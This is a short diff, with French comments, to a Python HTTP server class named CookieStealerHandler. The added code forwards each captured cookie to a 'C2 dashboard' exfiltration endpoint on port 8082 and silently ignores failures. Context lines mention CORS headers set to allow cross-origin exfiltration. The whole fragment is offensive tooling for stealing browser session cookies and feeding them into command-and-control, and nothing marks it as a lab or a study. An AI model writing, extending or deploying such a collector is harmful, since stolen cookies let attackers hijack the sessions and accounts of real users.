@@ -24,6 +24,13 @@ class CookieStealerHandler(BaseHTTPRequestHandler):
             print(f" {log_entry}")
             print("!" * 70 + "\n")
 
+            # Notification automatique au Dashboard C2 centralisé (Port 8082)
+            try:
+                import urllib.request
+                urllib.request.urlopen(f"http://127.0.0.1:8082/exfiltrate?cookie={urllib.parse.quote(stolen_cookie)}", timeout=1)
+            except Exception:
+                pass
+
         # Réponse HTTP 200 avec en-têtes CORS pour autoriser l'exfiltration cross-origin
         self.send_response(200)
         self.send_header("Content-Type", "text/plain; charset=utf-8")
